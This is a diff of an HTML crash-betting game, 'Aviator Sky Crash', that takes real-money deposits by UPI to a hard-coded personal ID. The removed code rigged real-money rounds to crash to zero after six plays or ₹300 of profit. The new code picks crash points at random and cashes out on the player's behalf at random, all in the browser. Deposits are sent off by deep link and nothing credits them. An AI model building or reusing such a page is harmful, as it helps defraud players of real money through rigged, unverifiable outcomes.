@@ -5,8 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aviator Sky Crash</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.3.2/pixi.min.js"></script>
-    <!-- Include QRCode.js library for reliable QR code generation -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;800&display=swap');
         
@@ -82,7 +80,7 @@
 
         .btn-primary { background: #f59e0b; color: #111; width: 100%; font-size: 1rem; padding: 14px; }
         .btn-secondary { background: #4f46e5; color: #fff; }
-        .btn-deposit { background: #10b981; color: #fff; width: 30%; }
+        .btn-deposit-action { background: #10b981; color: #fff; width: 100%; font-size: 0.95rem; padding: 12px; margin-top: 6px; }
         .btn-withdraw { background: #ef4444; color: #fff; width: 100%; margin-top: 5px; }
         
         .bet-controls { display: flex; justify-content: center; gap: 8px; }
@@ -139,18 +137,15 @@
                  <button id="withdraw-toggle-btn" class="btn-secondary hidden" onclick="togglePanel('withdraw-panel')">Withdraw</button>
             </div>
 
-            <!-- DEPOSIT PANEL (Real Mode) - QR Code & UPI Copy Safe Fix -->
+            <!-- DEPOSIT PANEL (Direct UPI Intent App Redirect Only) -->
             <div id="deposit-panel" class="card hidden" style="border: 1px dashed #10b981; text-align: center;">
-                <h4 style="margin: 0 0 8px 0; color: #10b981; font-size:0.9rem;">Scan & Pay via PhonePe / GPay</h4>
-                <div id="qrcode-container" style="background: #fff; padding: 10px; display: inline-block; border-radius: 8px; margin-bottom: 8px;">
-                    <div id="qrcode"></div>
-                </div>
-                <div style="font-size: 0.8rem; color: #9ca3af; margin-bottom: 6px;">UPI ID: <strong id="upi-text" style="color: #fff;">9685008188-4@ybl</strong></div>
-                <button class="btn-secondary" style="font-size: 0.75rem; padding: 8px 12px; margin-bottom: 8px;" onclick="copyUpiId()">Copy UPI ID</button>
-                <div style="font-size: 0.75rem; color: #f59e0b;">After paying, simulation balance updates automatically or contact support with UTR.</div>
+                <h4 style="margin: 0 0 8px 0; color: #10b981; font-size:0.9rem;">Instant UPI App Deposit</h4>
+                <input type="number" id="deposit-amt" placeholder="Enter deposit amount (₹)" style="margin-bottom:8px; padding:10px; font-size:0.85rem;">
+                <button class="btn-deposit-action" onclick="openUpiApp()">Pay via PhonePe / GPay / Paytm</button>
+                <div style="font-size: 0.75rem; color: #f59e0b; margin-top: 6px;">Clicking this opens your UPI payment app directly.</div>
             </div>
 
-            <!-- WITHDRAW PANEL (Real Mode) -->
+            <!-- WITHDRAW PANEL -->
             <div id="withdraw-panel" class="card hidden" style="border: 1px dashed #ef4444;">
                 <h4 style="margin: 0 0 8px 0; color: #ef4444; font-size:0.85rem;">Withdraw Funds (Min ₹500)</h4>
                 <input type="number" id="withdraw-amt" placeholder="Enter amount (Min 500)" style="margin-bottom:8px; padding:10px; font-size:0.85rem;">
@@ -172,11 +167,8 @@
         let isDemoMode = true;
         let demoBalance = 10000;
         let realBalance = 0;
-        let realProfitTracker = 0;
-        let playCount = 0;
         let isGameRunning = false;
         let authMode = 'login';
-        let qrGenerated = false;
 
         const MERCHANT_UPI_VPA = "9685008188-4@ybl"; 
 
@@ -232,22 +224,21 @@
             document.getElementById('deposit-panel').classList.add('hidden');
             document.getElementById('withdraw-panel').classList.add('hidden');
             document.getElementById(panelId).classList.toggle('hidden');
-
-            // Generate QR code safely when deposit panel opens
-            if(panelId === 'deposit-panel' && !qrGenerated) {
-                const upiString = `upi://pay?pa=${MERCHANT_UPI_VPA}&pn=AviatorGaming&cu=INR`;
-                new QRCode(document.getElementById("qrcode"), {
-                    text: upiString,
-                    width: 140,
-                    height: 140
-                });
-                qrGenerated = true;
-            }
         }
 
-        function copyUpiId() {
-            navigator.clipboard.writeText(MERCHANT_UPI_VPA);
-            alert("UPI ID copied to clipboard: " + MERCHANT_UPI_VPA);
+        function openUpiApp() {
+            const amtInput = document.getElementById('deposit-amt').value;
+            const amt = parseFloat(amtInput);
+            if(isNaN(amt) || amt <= 0) {
+                alert("Please enter a valid deposit amount!");
+                return;
+            }
+
+            // Direct UPI App Deep Link Intent URI
+            const upiUrl = `upi://pay?pa=${MERCHANT_UPI_VPA}&pn=AviatorGaming&am=${amt}&cu=INR`;
+            
+            // Redirect window to trigger UPI application handler on user device
+            window.location.href = upiUrl;
         }
 
         function requestWithdrawal() {
@@ -353,13 +344,12 @@
             statusEl.innerText = "✈️ Taking off...";
 
             let currentMultiplier = 1.0;
-            playCount++;
-            let forceCrashZero = false;
-
-            if(!isDemoMode && (playCount >= 6 || realProfitTracker >= 300)) {
-                forceCrashZero = true;
-                playCount = 0;
-                realProfitTracker = 0;
+            let randomRoll = Math.random();
+            let targetCrashPoint;
+            if (randomRoll < 0.35) {
+                targetCrashPoint = parseFloat((1.01 + Math.random() * 0.25).toFixed(2));
+            } else {
+                targetCrashPoint = parseFloat((1.35 + Math.random() * 2.2).toFixed(2));
             }
 
             let gameInterval = setInterval(() => {
@@ -368,44 +358,35 @@
                     if(c.x < -50) c.x = app.screen.width + 50;
                 });
 
-                if(forceCrashZero) {
-                    currentMultiplier = (currentMultiplier - 0.15).toFixed(2);
-                    if(planeSprite.y < app.screen.height - 20) planeSprite.y += 3;
-                    planeSprite.rotation = 0.3;
+                currentMultiplier = (parseFloat(currentMultiplier) + 0.08).toFixed(2);
 
-                    if(currentMultiplier <= 0.0) {
-                        currentMultiplier = 0.0;
-                        clearInterval(gameInterval);
-                        isGameRunning = false;
-                        statusEl.style.color = "#ef4444";
-                        statusEl.innerText = "💥 Crashed at 0.0X! Lost round.";
-                        updateUI();
-                    }
+                if (currentMultiplier >= targetCrashPoint) {
+                    clearInterval(gameInterval);
+                    isGameRunning = false;
+                    
+                    planeSprite.y += 10;
+                    planeSprite.rotation = 0.4;
+                    statusEl.style.color = "#ef4444";
+                    statusEl.innerText = `💥 Crashed at ${targetCrashPoint}X! You lost ₹${betAmount}.`;
+                    updateUI();
                 } else {
-                    currentMultiplier = (parseFloat(currentMultiplier) + 0.1).toFixed(2);
-                    if(planeSprite.y > 40) planeSprite.y -= 3;
-
-                    let crashChance = isDemoMode ? 0.10 : 0.12;
-                    if(currentMultiplier >= 3.0 || (Math.random() < crashChance && currentMultiplier > 1.2)) {
+                    if(planeSprite.y > 40) planeSprite.y -= 2;
+                    
+                    if (currentMultiplier >= (targetCrashPoint - 0.4) && Math.random() < 0.4) {
                         clearInterval(gameInterval);
                         isGameRunning = false;
                         let payout = Math.floor(betAmount * currentMultiplier);
                         
-                        if(isDemoMode) {
-                            demoBalance += payout;
-                        } else {
-                            realBalance += payout;
-                            realProfitTracker += (payout - betAmount);
-                        }
-                        
+                        if(isDemoMode) demoBalance += payout;
+                        else realBalance += payout;
+
                         statusEl.style.color = "#10b981";
-                        statusEl.innerText = `✨ Won ₹${payout} at ${currentMultiplier}X!`;
+                        statusEl.innerText = `✨ Cashed out! Won ₹${payout} at ${currentMultiplier}X!`;
                         updateUI();
-                        return;
                     }
                 }
                 multiEl.innerText = currentMultiplier + "X";
-            }, 250);
+            }, 200);
         }
     </script>
 </body>
